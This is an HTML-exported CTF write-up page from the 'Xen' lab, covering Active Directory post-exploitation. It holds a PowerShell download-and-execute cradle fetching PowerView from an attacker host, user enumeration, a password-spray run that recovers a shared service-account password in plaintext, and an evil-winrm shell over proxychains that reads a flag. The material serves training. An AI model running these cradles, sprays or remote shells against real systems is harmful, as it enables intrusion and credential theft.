@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html><head><title>CTFLover hack stuff | CTF solutions</title><base href="./"/><meta id="root-path" root-path="./"/><link href="/images/favicon.jpeg" rel="icon" sizes="96x96"/><meta content="width=device-width,initial-scale=1,user-scalable=yes,minimum-scale=1,maximum-scale=5" name="viewport"/><meta charset="utf-8"/><link href="lib/styles/obsidian-styles.css" rel="stylesheet"/><link href="lib/styles/theme.css" rel="stylesheet"/><link href="lib/styles/plugin-styles.css" rel="stylesheet"/><link href="lib/styles/snippets.css" rel="stylesheet"/><link href="lib/styles/generated-styles.css" rel="stylesheet"/><style></style><script src="lib/scripts/graph_view.js" type="module"></script><script src="lib/scripts/graph_wasm.js"></script><script src="lib/scripts/tinycolor.js"></script><script crossorigin="anonymous" integrity="sha512-Ch/O6kL8BqUwAfCF7Ie5SX1Hin+BJgYH4pNjRqXdTEqMsis1TUYg+j6nnI9uduPjGaj7DN4UKCZgpvoExt6dkw==" referrerpolicy="no-referrer" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.2.4/pixi.min.js"></script><script src="lib/scripts/webpage.js"></script><script src="lib/scripts/generated.js"></script></head><body class="theme-dark mod-linux show-inline-title loading"><div class="webpage-container"><div class="sidebar-left sidebar"><div class="sidebar-container"><div class="sidebar-sizer"><div class="sidebar-content-positioner"><div class="sidebar-content"><div><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" id="theme_toggle" type="checkbox"/><div class="toggle-background"></div></label></div><div class="tree-container file-tree mod-nav-indicator" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Xen</span><button class="clickable-icon collapse-tree-button is-collapsed"><svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"></svg></button></div><div class="tree-scroll-area"><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="05-nmap.html"><span class="tree-item-title">05-Nmap</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="10-enumeration.html"><span class="tree-item-title">10-Enumeration</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="15-smtp.html"><span class="tree-item-title">15-SMTP</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="20-citrix.html"><span class="tree-item-title">20-Citrix</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="25-getting-shell.html"><span class="tree-item-title">25-Getting Shell</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="30-deploy.html"><span class="tree-item-title">30-Deploy</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="35-ghost.html"><span class="tree-item-title">35-Ghost</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="40-camouflage.html"><span class="tree-item-title">40-Camouflage</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="45-doppelgänger.html"><span class="tree-item-title">45-Doppelgänger</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="50-owned.html"><span class="tree-item-title">50-Owned</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="creds.html"><span class="tree-item-title">creds</span></a></div><div class="tree-item-children"></div></div></div></div></div></div></div></div><div class="sidebar-gutter"><div class="clickable-icon sidebar-collapse-icon"><svg class="svg-icon" fill="none" height="100%" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewbox="0 0 24 24" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div></div><div class="document-container show"><div class="markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings show-indentation-guide allow-fold-lists show-properties" style="tab-size:4" tabindex="-1"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="markdown-preview-pusher" style="width:1px;height:.1px;margin-bottom:0"></div><div class="mod-header"><div class="inline-title" data-heading="45-Doppelgänger" id="45-Doppelgänger" style="display:block">45-Doppelgänger</div></div><div><p>Used PowerView.ps1 to gather information about users on AD.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">PS &gt; iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11/PowerView.ps1');get-netuser | ft samaccountname,admincount
+
+samaccountname                                                                                               admincount
+--------------                                                                                               ----------
+Administrator                                                                                                         1
+Guest
+krbtgt                                                                                                                1
+alarsson
+jmendes
+pmorgan
+awardel
+xenserver-svc
+print-svc                                                                                                             1
+mssql-svc
+mturner
+app-svc
+rprakash
+urquarti
+rdrew
+fboucher
+cmeller
+anagy
+backup-svc                                                                                                            1
+test-svc
+netscaler-svc
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>I ll take notes of these users.</p></div><div><p>I Found a password <code>#S3rvice#@cc</code> I ll try them on all users using DomainPasswordSpray.ps1</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">PS &gt; Invoke-DomainPasswordSpray -UserList usersAd -Password '#S3rvice#@cc' -OutFile hello.txt
+[*] Using usersAd as userlist to spray with
+[!] Warning: Users will not be checked for lockout threshold.
+[*] The domain password policy observation window is set to 30 minutes.
+[*] Setting a 30 minute wait in between sprays.
+[*] Password spraying has begun with 1 passwords
+[*] This might take a while depending on the total number of users
+[*] Now trying password #S3rvice#@cc against 22 users. Current time is 12:56 PM
+[*] Writing successes to hello.txt
+[*] 1 of 22 users tested
+[*] 2 of 22 users tested
+[*] 3 of 22 users tested
+[*] 4 of 22 users tested
+[*] 5 of 22 users tested
+[*] 6 of 22 users tested
+[*] 7 of 22 users tested
+[+] SUCCESS! User:xenserver-svc Password:#S3rvice#@cc
+[*] 8 of 22 users tested
+[+] SUCCESS! User:print-svc Password:#S3rvice#@cc
+[*] 9 of 22 users tested
+[+] SUCCESS! User:mssql-svc Password:#S3rvice#@cc
+[*] 10 of 22 users tested
+[*] 11 of 22 users tested
+[*] 12 of 22 users tested
+[*] 13 of 22 users tested
+[*] 14 of 22 users tested
+[*] 15 of 22 users tested
+[*] 16 of 22 users tested
+[*] 17 of 22 users tested
+[*] 18 of 22 users tested
+[+] SUCCESS! User:backup-svc Password:#S3rvice#@cc
+[*] 19 of 22 users tested
+[*] 20 of 22 users tested
+[+] SUCCESS! User:netscaler-svc Password:#S3rvice#@cc
+[*] 21 of 22 users tested
+[*] 22 of 22 users tested
+[*] Password spraying is complete
+[+] Any passwords that were successfully sprayed have been output to hello.txt
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>Like before I ll again scan the network and look for any IP which has wsman enabled.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11');
+Invoke-Portscan -Hosts 172.16.249.0/24 -T 4 -Ports "5985,5986,3389"
+</code><button class="copy-code-button">Copy</button></pre></div><div><p><span alt="Pasted image 20240122113840.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240122113840.png"><img alt="Pasted image 20240122113840.png" src="pasted-image-20240122113840.png"/></span><br/>RDP, and wsman is on.</p></div><div><p>Bloodhound says that backup-svc can rdp in to dc.<br/><span alt="Pasted image 20240122120344.png" class="internal-embed media-embed image-embed is-loaded" src="pasted-image-20240122120344.png"><img alt="Pasted image 20240122120344.png" src="pasted-image-20240122120344.png"/></span></p></div><div><p>Got a evil-winrm shell -&gt;</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  Xen proxychains evil-winrm -i 172.16.249.200 -u backup-svc -p '#S3rvice#@cc' 
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:5985  ...  OK
+        *Evil-WinRM* PS C:\Users\backup-svc\Documents&gt; dir
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:5985  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:5985  ...  OK
+*Evil-WinRM* PS C:\Users\backup-svc\Documents&gt; type ../Desktop/flag.txt
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:5985  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:5985  ...  OK
+XEN{y_5h4r3d_p@55..}
+</code><button class="copy-code-button">Copy</button></pre></div><div class="mod-footer"></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-gutter"><div class="clickable-icon sidebar-collapse-icon"><svg class="svg-icon" fill="none" height="100%" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewbox="0 0 24 24" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-container"><div class="sidebar-sizer"><div class="sidebar-content-positioner"><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder"><div class="graph-view-container"><div aria-label="Expand" class="graph-icon graph-expand" data-tooltip-position="top" role="button"><svg class="svg-icon" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><line x1="7" x2="17" y1="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div><canvas height="512px" id="graph-canvas" width="512px"></canvas></div></div></div><div class="tree-container outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button"><svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"></svg></button></div><div class="tree-scroll-area"></div></div></div></div></div></div></div></div></body></html>
